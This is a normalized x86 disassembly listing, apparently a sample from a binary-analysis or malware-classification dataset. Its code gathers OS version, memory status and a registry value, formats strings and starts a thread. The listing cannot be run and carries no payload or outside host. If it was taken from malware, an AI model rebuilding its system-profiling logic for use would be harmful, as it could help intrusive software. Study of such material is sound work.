mov [ esp + 0x18 ] ebx
mov [ eax + ebx ] 0x0
test esi esi
jbe r-xdata
call sub_40fc40
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
lea edi [ ecx + eax ]
mov ecx esi
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x24 ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x14 ]
mov [ esp + 0x18 ] eax
mov [ ecx + eax ] 0x0
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
mov ecx esi
mov esi rw-data
lea edi [ eax + edx ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x14 ]
mov [ esp + 0x18 ] ebx
mov [ eax + ebx ] 0x0
call [ ebp + 0x12a8 ]
push eax
lea ecx [ esp + 0x140 ]
push rw-data
push ecx
call [ ebp + 0x14dc ]
lea edi [ esp + 0x148 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
mov edx [ r--data ]
not ecx
dec ecx
mov esi ecx
mov ecx [ esp + 0x18 ]
sub edx ecx
cmp edx esi
ja r-xdata
mov ecx [ esp + 0x18 ]
push 0x0
lea ebx [ ecx + esi ]
lea ecx [ esp + 0x14 ]
push ebx
call sub_404170
test al al
je r-xdata
test esi esi
jbe r-xdata
call sub_40fc40
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
mov ecx esi
lea esi [ esp + 0x13c ]
lea edi [ eax + edx ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x14 ]
mov [ esp + 0x18 ] ebx
mov [ eax + ebx ] 0x0
lea edx [ esp + 0x364 ]
push edx
call [ ebp + 0x12ec ]
lea eax [ esp + 0x13c ]
push rw-data
push eax
call [ ebp + 0x1340 ]
mov eax [ esp + 0x37c ]
cmp eax 0x24a
ja r-xdata
mov eax [ esp + 0x18 ]
push 0x0
lea ecx [ esp + 0x14 ]
lea ebx [ eax + esi ]
push ebx
call sub_404170
test al al
je r-xdata
cmp eax 0xfa0
je r-xdata
je r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
lea edi [ edx + ecx ]
mov ecx esi
mov eax ecx
lea esi [ esp + 0x13c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x14 ]
mov [ esp + 0x18 ] ebx
mov [ ecx + ebx ] 0x0
push rw-data
lea ecx [ esp + 0x13c ]
push rw-data
push ecx
jmp r-xdata
lea eax [ esp + 0x13c ]
push rw-data
push eax
jmp r-xdata
sub eax 0x182
je r-xdata
test esi esi
jbe r-xdata
call sub_40fc40
call [ ebp + 0x1334 ]
lea edi [ esp + 0x13c ]
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x18 ]
[ edi ]
mov eax [ r--data ]
not ecx
dec ecx
sub eax edx
mov esi ecx
cmp eax esi
ja r-xdata
push rw-data
jmp r-xdata
sub eax 0x64
jne r-xdata
call sub_402ee0
push 0x3e8
mov esi eax
mov edi edx
call [ ebp + 0x1394 ]
call sub_402ee0
sub eax esi
push 0x0
sbb edx edi
push 0x186a0
push edx
push eax
call sub_408ea0
xor edx edx
mov esi 0xa
mov ecx eax
div esi
mov eax 0xcccccccd
push edx
mul ecx
shr edx 0x3
push edx
lea ecx [ esp + 0x144 ]
push rw-data
push ecx
call [ ebp + 0x14dc ]
lea edi [ esp + 0x14c ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
mov edx [ r--data ]
not ecx
dec ecx
mov esi ecx
mov ecx [ esp + 0x18 ]
sub edx ecx
cmp edx esi
ja r-xdata
mov ecx [ esp + 0x18 ]
push 0x0
lea ebx [ ecx + esi ]
lea ecx [ esp + 0x14 ]
push ebx
call sub_404170
test al al
je r-xdata
lea edx [ esp + 0x140 ]
push edx
lea ecx [ esp + 0x13c ]
push rw-data
push ecx
jmp r-xdata
test esi esi
jbe r-xdata
call sub_40fc40
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
mov ecx esi
lea esi [ esp + 0x13c ]
lea edi [ eax + edx ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x14 ]
mov [ esp + 0x18 ] ebx
mov [ eax + ebx ] 0x0
mov ecx 0x27
xor eax eax
lea edi [ esp + 0xa0 ]
[ edi ]
lea ecx [ esp + 0xa0 ]
mov [ esp + 0xa0 ] 0x9c
push ecx
call [ ebp + 0x1300 ]
cmp eax 0x1
sete bl
test bl bl
jne r-xdata
mov eax [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
lea ebx [ eax + esi ]
call sub_4042e0
cmp eax ebx
jae r-xdata
mov eax [ esp + 0xb0 ]
sub eax 0x0
je r-xdata
lea edx [ esp + 0xa0 ]
mov [ esp + 0xa0 ] 0x94
push edx
call [ ebp + 0x1300 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
call sub_40fc40
lea edx [ esp + 0x13c ]
push rw-data
push edx
dec eax
je r-xdata
lea eax [ esp + 0x13c ]
push rw-data
push eax
call [ ebp + 0x1340 ]
jmp r-xdata
test ebx ebx
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
test esi esi
jbe r-xdata
call sub_40fc40
mov eax [ esp + 0xa4 ]
mov esi 0x4
cmp eax esi
jne r-xdata
dec eax
jne r-xdata
lea edi [ esp + 0x13c ]
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x18 ]
[ edi ]
not ecx
dec ecx
mov esi ecx
mov ecx [ r--data ]
sub ecx edx
cmp ecx esi
ja r-xdata
cmp [ esp + 0x1c ] ebx
jae r-xdata
test ecx ecx
je r-xdata
cmp al 0xff
je r-xdata
push 0x8003
call [ SetErrorMode@IAT ]
lea eax [ esp + 0x80 ]
mov [ esp + 0x80 ] 0x20
push eax
call [ ebp + 0x1310 ]
mov ecx [ esp + 0x94 ]
mov edx [ esp + 0x90 ]
mov eax [ esp + 0x84 ]
shr ecx 0x14
push ecx
mov ecx [ esp + 0x8c ]
shr edx 0x14
push edx
push eax
shr ecx 0x14
push ecx
lea edx [ esp + 0x14c ]
push rw-data
push edx
call [ ebp + 0x14dc ]
lea edi [ esp + 0x154 ]
or ecx 0xffffffff
xor eax eax
add esp 0x18
[ edi ]
mov eax [ r--data ]
mov edx [ esp + 0x18 ]
not ecx
dec ecx
sub eax edx
mov esi ecx
cmp eax esi
ja r-xdata
mov edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
lea ebx [ edx + esi ]
call sub_4042e0
cmp eax ebx
jae r-xdata
lea eax [ esp + 0x13c ]
push rw-data
push eax
call [ ebp + 0x1334 ]
mov eax [ esp + 0xa8 ]
test eax eax
jne r-xdata
mov eax [ esp + 0xa4 ]
mov esi 0x4
cmp eax esi
ja r-xdata
mov edx [ esp + 0x18 ]
push ebx
lea edi [ edx + ecx ]
mov ecx esi
mov eax ecx
lea esi [ esp + 0x140 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push ebx
lea ecx [ esp + 0x14 ]
call sub_4042f0
mov ecx [ esp + 0x14 ]
push ebx
jmp r-xdata
test ebx ebx
jne r-xdata
test esi esi
jbe r-xdata
call sub_40fc40
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
call sub_40fc40
cmp [ esp + 0xa8 ] 0xa
jne r-xdata
lea eax [ esp + 0x13c ]
push rw-data
push eax
call [ ebp + 0x1340 ]
mov al [ esp + 0xb5 ]
cmp al 0x43
je r-xdata
mov eax [ esp + 0xa4 ]
mov edi 0x5
cmp eax edi
jne r-xdata
lea ecx [ esp + 0x13c ]
push rw-data
push ecx
call [ ebp + 0x1340 ]
lea ecx [ esp + 0x14 ]
call sub_404150
dec al
push ebx
mov [ ecx - 0x1 ] al
lea ecx [ esp + 0x14 ]
call sub_404100
jmp r-xdata
mov [ esp + 0x20 ] 0x43
mov [ esp + 0x24 ] 0x18
mov ecx [ esp + 0x18 ]
lea ebx [ ecx + esi ]
lea ecx [ esp + 0x10 ]
call sub_4042e0
cmp eax ebx
jae r-xdata
test ebx ebx
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
cmp [ esp + 0xa8 ] 0x5a
jne r-xdata
lea edx [ esp + 0x13c ]
push rw-data
push edx
call [ ebp + 0x1340 ]
cmp [ esp + 0xb5 ] 0x41
jne r-xdata
lea ecx [ esp + 0x13c ]
push rw-data
push ecx
call [ ebp + 0x1334 ]
cmp al 0x42
jne r-xdata
test bl bl
je r-xdata
mov eax [ esp + 0xa8 ]
test eax eax
jne r-xdata
push rw-data
jmp [ edi * 4 + jump_table_404000 ]
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
call sub_40fc40
cmp [ esp + 0x1c ] ebx
jae r-xdata
test ecx ecx
je r-xdata
cmp al 0xff
je r-xdata
lea ecx [ esp + 0x13c ]
push rw-data
push ecx
jmp r-xdata
cmp [ esp + 0xa4 ] esi
jne r-xdata
lea eax [ esp + 0x13c ]
push rw-data
push eax
call [ ebp + 0x1334 ]
cmp [ esp + 0xa4 ] esi
jne r-xdata
lea eax [ esp + 0x20 ]
push eax
push 0x1
push 0x0
push rw-data
push 0x80000002
call [ ebp + 0x1530 ]
mov eax [ esp + 0x20 ]
lea ecx [ esp + 0x40 ]
lea edx [ esp + 0x388 ]
push ecx
push edx
push 0x0
push 0x0
push rw-data
push eax
call [ ebp + 0x1538 ]
mov ecx [ esp + 0x20 ]
push ecx
call [ ebp + 0x1504 ]
lea edx [ esp + 0x388 ]
push edx
push rw-data
call [ ebp + 0x133c ]
test eax eax
jne r-xdata
mov al [ esp + 0x13a ]
cmp al 0x1
jne r-xdata
cmp [ esp + 0xa8 ] 0x1
jne r-xdata
lea edx [ esp + 0x13c ]
push rw-data
push edx
call [ ebp + 0x1340 ]
cmp [ esp + 0xa4 ] edi
jne r-xdata
mov ecx [ esp + 0x20 ]
mov eax [ esp + 0x24 ]
inc ecx
dec eax
mov [ esp + 0x20 ] ecx
mov [ esp + 0x24 ] eax
jne r-xdata
lea edi [ esp + 0x13c ]
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x18 ]
[ edi ]
mov eax [ r--data ]
not ecx
dec ecx
sub eax edx
mov esi ecx
cmp eax esi
ja r-xdata
push rw-data
jmp r-xdata
mov [ esp + 0x13c ] 0x0
jmp r-xdata
lea edx [ esp + 0x13c ]
push rw-data
push edx
call [ ebp + 0x1334 ]
push esi
lea eax [ esp + 0x3dc ]
push rw-data
push eax
call [ ebp + 0x14dc ]
add esp 0xc
lea ecx [ esp + 0x30 ]
lea edx [ esp + 0x28 ]
lea eax [ esp + 0x44 ]
push ecx
push edx
lea ecx [ esp + 0x3e0 ]
push eax
push ecx
call [ ebp + 0x1308 ]
test eax eax
je r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
push rw-data
lea eax [ esp + 0x13c ]
push rw-data
push eax
jmp r-xdata
test ebx ebx
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov eax [ esp + 0x18 ]
push ebx
lea edi [ eax + ecx ]
mov ecx esi
mov edx ecx
lea esi [ esp + 0x140 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
push ebx
lea ecx [ esp + 0x14 ]
call sub_4042f0
mov ecx [ esp + 0x14 ]
push ebx
jmp r-xdata
test ebx ebx
jne r-xdata
call [ ebp + 0x1340 ]
lea ecx [ esp + 0x388 ]
push ecx
push rw-data
call [ ebp + 0x133c ]
test eax eax
jne r-xdata
lea eax [ esp + 0x13c ]
push rw-data
push eax
call [ ebp + 0x1334 ]
cmp al 0x3
jne r-xdata
mov eax [ esp + 0x138 ]
test ah 0x2
je r-xdata
lea eax [ esp + 0x13c ]
push rw-data
push eax
call [ ebp + 0x1340 ]
mov esi [ esp + 0x20 ]
lea ecx [ esp + 0x13c ]
push esi
push rw-data
push ecx
call [ ebp + 0x14dc ]
add esp 0xc
lea edx [ esp + 0x13c ]
push edx
call [ ebp + 0x12b8 ]
mov edi eax
lea eax [ esp + 0x13c ]
push rw-data
push eax
call [ ebp + 0x1334 ]
cmp edi 0x6
ja r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
test eax eax
pop ebx
jne r-xdata
test esi esi
jbe r-xdata
call sub_40fc40
lea ecx [ esp + 0x140 ]
push ecx
lea edx [ esp + 0x13c ]
push edx
call [ ebp + 0x1348 ]
test eax eax
je r-xdata
mov eax [ esp + 0x28 ]
lea edx [ esp + 0x50 ]
push 0xa
push edx
push eax
call sub_410102
mov edx [ esp + 0x3c ]
lea ecx [ esp + 0x74 ]
push 0xa
push ecx
push edx
jmp r-xdata
lea eax [ esp + 0x140 ]
push eax
call [ ebp + 0x1334 ]
push esi
lea ecx [ esp + 0x3dc ]
push rw-data
push ecx
call [ ebp + 0x14dc ]
add esp 0xc
lea edx [ esp + 0x30 ]
lea eax [ esp + 0x28 ]
lea ecx [ esp + 0x44 ]
push edx
push eax
lea edx [ esp + 0x3e0 ]
push ecx
push edx
call [ ebp + 0x1308 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x28 ]
lea eax [ esp + 0x50 ]
push 0xa
push eax
push ecx
call sub_410102
mov eax [ esp + 0x3c ]
lea edx [ esp + 0x74 ]
push 0xa
push edx
push eax
call [ ebp + 0x1334 ]
cmp [ esp + 0x1c ] ebx
jae r-xdata
test ecx ecx
je r-xdata
cmp al 0xff
je r-xdata
lea ecx [ esp + 0x14 ]
call sub_404150
dec al
push ebx
mov [ ecx - 0x1 ] al
lea ecx [ esp + 0x14 ]
call sub_404100
jmp r-xdata
lea eax [ esp + 0x388 ]
push eax
push rw-data
call [ ebp + 0x133c ]
test eax eax
jne r-xdata
lea edx [ esp + 0x13c ]
push rw-data
push edx
call [ ebp + 0x1334 ]
mov eax [ esp + 0xa4 ]
mov edx [ esp + 0xac ]
cmp eax esi
ja r-xdata
mov al [ esp + 0x138 ]
test al 0x80
je r-xdata
lea edx [ esp + 0x13c ]
push rw-data
push edx
jmp r-xdata
push rw-data
jmp r-xdata
mov ecx [ esp + 0x8 ]
push 0x0
push 0x0
push ecx
push eax
mov eax [ esp + 0x5f0 ]
push 0x0
push 0x1
mov edx [ eax + 0xc ]
mov eax [ eax + 0x10 ]
push edx
push eax
lea ecx [ esp + 0x34c ]
call sub_401ad0
lea ecx [ esp + 0x32c ]
mov [ esp + 0x5d0 ] 0x1
push ecx
mov ecx [ esp + 0x5e0 ]
call sub_402bd0
lea ecx [ esp + 0x32c ]
mov [ esp + 0x5d0 ] 0x0
call sub_401bf0
mov ecx [ esp + 0x4 ]
test ecx ecx
je r-xdata
mov eax r--data
mov ecx [ esp + 0x18 ]
lea ebx [ ecx + esi ]
lea ecx [ esp + 0x10 ]
call sub_4042e0
cmp eax ebx
jae r-xdata
call sub_410102
mov eax [ esp + 0x48 ]
mov edx [ esp + 0x4c ]
add esp 0x18
mov ecx 0x14
call sub_408e80
mov edx [ esp + 0x2c ]
mov esi eax
mov eax [ esp + 0x28 ]
mov ecx 0x14
call sub_408e80
lea ecx [ esp + 0x50 ]
lea edx [ esp + 0x68 ]
push ecx
push eax
push edx
push esi
lea eax [ esp + 0x3e8 ]
push rw-data
push eax
call [ ebp + 0x14dc ]
add esp 0x18
lea ecx [ esp + 0x3d8 ]
lea edx [ esp + 0x13c ]
push ecx
push edx
jmp r-xdata
mov edx [ esp + 0x18 ]
push ebx
lea edi [ edx + ecx ]
mov ecx esi
mov eax ecx
lea esi [ esp + 0x140 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push ebx
lea ecx [ esp + 0x14 ]
call sub_4042f0
mov ecx [ esp + 0x14 ]
push ebx
jmp r-xdata
test ebx ebx
jne r-xdata
push rw-data
and edx 0xffff
lea eax [ esp + 0xb4 ]
push edx
lea ecx [ esp + 0x140 ]
push eax
push ecx
lea edx [ esp + 0x148 ]
push rw-data
push edx
call [ ebp + 0x14dc ]
add esp 0x14
jmp r-xdata
and edx 0xffff
lea ecx [ esp + 0xb4 ]
push edx
mov edx [ esp + 0xac ]
push ecx
push edx
push eax
lea eax [ esp + 0x14c ]
push eax
lea ecx [ esp + 0x150 ]
push rw-data
push ecx
call [ ebp + 0x14dc ]
add esp 0x1c
jmp r-xdata
test al 0x2
jne r-xdata
lea eax [ esp + 0x13c ]
push rw-data
push eax
jmp r-xdata
call [ ebp + 0x1334 ]
lea ecx [ esp + 0x140 ]
push ecx
mov ecx [ esp + 0x5c8 ]
mov [ fs : 0x0 ] ecx
add esp 0x5d4
retn
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
call sub_40fc40
lea ecx [ esp + 0x14 ]
call sub_404150
dec al
push ebx
mov [ ecx - 0x1 ] al
lea ecx [ esp + 0x14 ]
call sub_404100
jmp r-xdata
lea edx [ esp + 0x13c ]
push rw-data
push edx
jmp r-xdata
dec ecx
push ecx
call sub_408e5f
add esp 0x4
cmp al 0xff
je r-xdata
test ebx ebx
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
dec al
mov [ ecx - 0x1 ] al
mov ecx [ esp + 0x5c8 ]
mov [ fs : 0x0 ] ecx
add esp 0x5d4
retn
cmp [ esp + 0x1c ] ebx
jae r-xdata
test ecx ecx
je r-xdata
cmp al 0xff
je r-xdata
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
mov ecx esi
lea esi [ esp + 0x13c ]
lea edi [ edx + eax ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push ebx
and ecx 0x3
[ edi ] [ esi ]
push ebx
lea ecx [ esp + 0x14 ]
call sub_4042f0
push ebx
jmp r-xdata
test ebx ebx
jne r-xdata
lea ecx [ esp + 0x14 ]
call sub_404150
dec al
push ebx
mov [ ecx - 0x1 ] al
lea ecx [ esp + 0x14 ]
call sub_404100
jmp r-xdata
sub_404040
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
retn
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
push ecx
call sub_408e5f
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
sub_404080
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push 0xc
mov cl [ eax ]
mov [ esi ] cl
call sub_408e6a
add esp 0x4
mov [ eax ] eax
mov [ eax + 0x4 ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x0
mov eax esi
pop esi
retn 0x4
sub_4040b0
push ebx
push esi
push edi
mov edi ecx
mov ebx [ edi + 0x4 ]
mov esi [ ebx ]
cmp esi ebx
je r-xdata
mov eax [ edi + 0x4 ]
push eax
call sub_408e5f
add esp 0x4
xor eax eax
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] eax
pop edi
pop esi
pop ebx
retn
mov eax esi
mov esi [ esi ]
push eax
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
mov [ ecx ] edx
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
call sub_408e5f
mov ecx [ edi + 0x8 ]
add esp 0x4
dec ecx
cmp esi ebx
mov [ edi + 0x8 ] ecx
jne r-xdata
sub_404100
mov al [ esp + 0x4 ]
push esi
test al al
mov esi ecx
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
retn 0x4
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
push ecx
call sub_408e5f
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
sub_404170
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
cmp edi 0xfffffffd
mov esi ecx
jbe r-xdata
mov eax [ esi + 0x4 ]
xor ebx ebx
cmp eax ebx
je r-xdata
call sub_40fc40
mov cl [ esp + 0x14 ]
cmp edi ebx
jne r-xdata
mov cl [ eax - 0x1 ]
cmp cl bl
je r-xdata
cmp cl bl
je r-xdata
cmp cl bl
je r-xdata
cmp cl 0xff
je r-xdata
cmp [ esi + 0xc ] edi
jae r-xdata
mov ecx [ esi + 0xc ]
cmp ecx 0x1f
ja r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
cmp edi ebx
jne r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
retn 0x8
push edi
mov ecx esi
call sub_4042f0
cmp eax ebx
je r-xdata
cmp ecx edi
jae r-xdata
pop edi
pop esi
xor al al
pop ebx
retn 0x8
mov [ esi + 0x8 ] ebx
mov [ eax ] bl
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
pop edi
pop esi
xor al al
pop ebx
retn 0x8
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
dec cl
pop edi
mov [ eax - 0x1 ] cl
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
pop esi
xor al al
pop ebx
retn 0x8
push edi
mov ecx esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
call sub_4042f0
pop edi
pop esi
mov al 0x1
pop ebx
retn 0x8
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ecx
call sub_408e5f
add esp 0x4
cmp al 0xff
je r-xdata
push ecx
call sub_408e5f
add esp 0x4
cmp al 0xff
je r-xdata
dec al
pop edi
mov [ ecx ] al
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
pop esi
xor al al
pop ebx
retn 0x8
dec al
push edi
mov [ ecx ] al
mov ecx esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
call sub_4042f0
pop edi
pop esi
mov al 0x1
pop ebx
retn 0x8
sub_404290
mov eax [ esp + 0x8 ]
push esi
mov esi ecx
push edi
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
mov edi [ eax ]
push eax
mov [ ecx ] edx
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
call sub_408e5f
mov eax [ esi + 0x8 ]
add esp 0x4
dec eax
mov [ esi + 0x8 ] eax
mov eax [ esp + 0xc ]
mov [ eax ] edi
pop edi
pop esi
retn 0x8
sub_4042f0
push ebp
mov ebp esp
push 0xffffffff
push sub_4105c0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi eax
or esi 0x1f
push edi
mov ebx ecx
cmp esi 0xfffffffd
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] esi
jbe r-xdata
lea eax [ esi + 0x2 ]
mov [ ebp - 0x4 ] 0x0
test eax eax
jge r-xdata
mov [ ebp - 0x14 ] eax
mov esi eax
push eax
call sub_408e6a
add esp 0x4
mov [ ebp + 0x8 ] eax
jmp r-xdata
xor eax eax
mov eax [ ebx + 0x8 ]
test eax eax
jbe r-xdata
mov eax [ ebx + 0x4 ]
mov edi [ ebx + 0x8 ]
test eax eax
je r-xdata
cmp eax esi
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] 0x0
inc eax
cmp edi esi
mov [ ebx + 0x4 ] eax
mov [ eax - 0x1 ] 0x0
mov [ ebx + 0xc ] esi
ja r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
mov esi [ ebx + 0x4 ]
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx ecx
shr ecx 0x2
lea edi [ eax + 0x1 ]
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ ebp - 0x14 ]
mov eax esi
mov ecx [ ebx + 0x4 ]
mov [ ebx + 0x8 ] esi
pop edi
mov [ ecx + esi ] 0x0
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov esi edi
push ecx
call sub_408e5f
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
sub_404400
push ebx
push esi
mov esi ecx
push edi
mov edi [ esp + 0x10 ]
cmp [ esi + 0x8 ] edi
jae r-xdata
mov eax [ esi + 0x8 ]
mov edx [ esp + 0x14 ]
sub eax edi
cmp eax edx
jae r-xdata
call sub_40fe6c
mov ebx [ esp + 0x1c ]
mov ecx edx
cmp edx ebx
jb r-xdata
mov edx eax
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov ecx ebx
lea esi [ eax + edi ]
xor esi esi
jmp r-xdata
test eax eax
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
mov edi [ esp + 0x18 ]
xor eax eax
[ esi ] [ edi ]
je r-xdata
pop edi
pop esi
pop ebx
retn 0x10
cmp edx ebx
jae r-xdata
xor eax eax
cmp edx ebx
setne al
pop edi
pop esi
or eax 0xffffffff
pop ebx
retn 0x10
sub_4044a0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4105e8
push eax
mov [ fs : 0x0 ] esp
sub esp 0x50
push ebx
push ebp
push esi
mov esi [ esp + 0x74 ]
push edi
mov eax [ esi + 0x14 ]
test eax eax
jne r-xdata
cmp eax 0x1
jne r-xdata
push 0xc
call sub_4083df
mov ebx [ esp + 0x78 ]
mov ebp [ esp + 0x74 ]
mov edi eax
add esp 0x4
mov [ edi ] ebx
mov eax [ esi + 0x10 ]
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebp
mov ecx [ rw-data ]
push 0x1388
push ecx
call [ ebp + 0x13c8 ]
cmp eax 0x102
jne r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov edx [ esp + 0x70 ]
push edx
call sub_404cf0
add esp 0x4
mov eax [ esi + 0x10 ]
lea ecx [ esp + 0x38 ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x1
push 0x1
push 0x1
push eax
call sub_401ad0
lea ecx [ esp + 0x38 ]
mov [ esp + 0x68 ] 0x2
push ecx
mov ecx [ esp + 0x78 ]
call sub_402bd0
lea ecx [ esp + 0x38 ]
mov [ rw-data ] 0x0
mov [ esp + 0x68 ] 0xffffffff
call sub_401bf0
pop edi
pop esi
pop ebp
xor al al
pop ebx
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
add esp 0x5c
retn
mov al [ rw-data ]
test al al
jne r-xdata
pop edi
pop esi
pop ebp
xor al al
pop ebx
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
add esp 0x5c
retn
mov ebx [ esp + 0x70 ]
push rw-data
call [ ebx + 0x1278 ]
mov edx [ esi + 0x10 ]
mov edi rw-data
mov [ rw-data ] edx
mov ecx [ esi + 0x1c ]
mov esi [ esi + 0x24 ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push rw-data
and ecx 0x3
[ edi ] [ esi ]
call [ ebx + 0x1330 ]
mov ecx [ esp + 0x60 ]
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x5c
retn
pop edi
pop esi
pop ebp
xor al al
pop ebx
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
add esp 0x5c
retn
mov eax [ esi + 0x10 ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x1
push 0x1
push eax
lea ecx [ esp + 0x30 ]
call sub_401ad0
lea ecx [ esp + 0x10 ]
mov [ esp + 0x68 ] 0x1
push ecx
mov ecx ebx
call sub_402bd0
lea ecx [ esp + 0x10 ]
mov [ esp + 0x68 ] 0xffffffff
call sub_401bf0
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
add esp 0x5c
retn
mov edx [ esi + 0x10 ]
lea eax [ esp + 0x70 ]
push eax
push 0x0
push edi
push sub_404790
push 0x0
push 0x0
mov [ rw-data ] edx
call [ ebp + 0x1264 ]
test eax eax
jne r-xdata
mov ecx [ esi + 0x10 ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x1
push 0x1
push ecx
lea ecx [ esp + 0x30 ]
call sub_401ad0
lea edx [ esp + 0x10 ]
mov ecx ebx
push edx
mov [ esp + 0x6c ] 0x0
call sub_402bd0
lea ecx [ esp + 0x10 ]
mov [ rw-data ] 0x1
mov [ esp + 0x68 ] 0xffffffff
call sub_401bf0
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
add esp 0x5c
retn
pop edi
pop esi
mov [ rw-data ] al
pop ebp
xor al al
pop ebx
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
add esp 0x5c
retn
sub_404700
sub esp 0x128
push ebx
push esi
